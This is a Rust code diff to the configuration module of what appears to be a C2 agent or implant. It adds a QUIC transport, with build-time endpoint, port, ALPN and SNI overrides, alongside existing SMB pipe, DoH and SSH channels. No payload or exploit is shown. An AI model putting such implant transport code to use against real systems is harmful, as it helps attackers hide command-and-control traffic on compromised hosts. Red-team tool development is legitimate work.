@@ -55,6 +55,10 @@ const BAKED_SMB_PIPE_HOST: Option<&str> = option_env!("SYS_SMB_PIPE_HOST");
 const BAKED_SMB_PIPE_NAME: Option<&str> = option_env!("SYS_SMB_PIPE_NAME");
 const BAKED_SMB_PIPE_MODE: Option<&str> = option_env!("SYS_SMB_PIPE_MODE");
 const BAKED_SMB_TCP_RELAY_PORT: Option<&str> = option_env!("SYS_SMB_TCP_RELAY_PORT");
+const BAKED_QUIC_ENDPOINT: Option<&str> = option_env!("SYS_QUIC_ENDPOINT");
+const BAKED_QUIC_PORT: Option<&str> = option_env!("SYS_QUIC_PORT");
+const BAKED_QUIC_ALPN: Option<&str> = option_env!("SYS_QUIC_ALPN");
+const BAKED_QUIC_SNI: Option<&str> = option_env!("SYS_QUIC_SNI");
 
 // Dependency note: this module expects `hmac` and `hex` in agent/Cargo.toml.
 // Prompt scope is limited to config.rs, so dependency additions are tracked
@@ -173,6 +177,10 @@ struct BuildOverrideValues<'a> {
     smb_pipe_name: Option<&'a str>,
     smb_pipe_mode: Option<&'a str>,
     smb_tcp_relay_port: Option<&'a str>,
+    quic_endpoint: Option<&'a str>,
+    quic_port: Option<&'a str>,
+    quic_alpn: Option<&'a str>,
+    quic_sni: Option<&'a str>,
 }
 
 fn apply_baked_build_overrides(config: Config) -> Result<Config> {
@@ -197,6 +205,10 @@ fn apply_baked_build_overrides(config: Config) -> Result<Config> {
             smb_pipe_name: BAKED_SMB_PIPE_NAME,
             smb_pipe_mode: BAKED_SMB_PIPE_MODE,
             smb_tcp_relay_port: BAKED_SMB_TCP_RELAY_PORT,
+            quic_endpoint: BAKED_QUIC_ENDPOINT,
+            quic_port: BAKED_QUIC_PORT,
+            quic_alpn: BAKED_QUIC_ALPN,
+            quic_sni: BAKED_QUIC_SNI,
         },
     )
 }
@@ -277,6 +289,8 @@ fn apply_transport_override(
     config.malleable_profile.smb_pipe_name = None;
     config.malleable_profile.smb_pipe_mode = None;
     config.malleable_profile.smb_tcp_relay_port = None;
+    config.malleable_profile.c2_quic.enabled = false;
+    config.malleable_profile.c2_quic.endpoint.clear();
 
     match raw_transport.to_ascii_lowercase().as_str() {
         "tls" => Ok(()),
@@ -374,8 +388,31 @@ fn apply_transport_override(
                 };
             Ok(())
         }
+        "quic" => {
+            config.malleable_profile.c2_quic.enabled = true;
+            config.malleable_profile.c2_quic.endpoint = nonempty(overrides.quic_endpoint)
+                .map(str::to_string)
+                .or_else(|| host_from_addr(overrides.c2_addr))
+                .ok_or_else(|| {
+                    anyhow::anyhow!(
+                        "SYS_QUIC_ENDPOINT or SYS_C_ADDR is required for quic transport"
+                    )
+                })?;
+            config.malleable_profile.c2_quic.port = match nonempty(overrides.quic_port) {
+                Some(port) => port.parse().with_context(|| {
+                    format!("SYS_QUIC_PORT must be an unsigned 16-bit integer, got '{port}'")
+                })?,
+                None => 443,
+            };
+            if let Some(alpn) = nonempty(overrides.quic_alpn).map(str::to_string) {
+                config.malleable_profile.c2_quic.alpn = alpn;
+            }
+            config.malleable_profile.c2_quic.sni =
+                nonempty(overrides.quic_sni).map(str::to_string);
+            Ok(())
+        }
         other => {
-            anyhow::bail!("SYS_TRANSPORT must be one of tls, http, doh, ssh, smb; got '{other}'")
+            anyhow::bail!("SYS_TRANSPORT must be one of tls, http, doh, ssh, smb, quic; got '{other}'")
         }
     }
 }
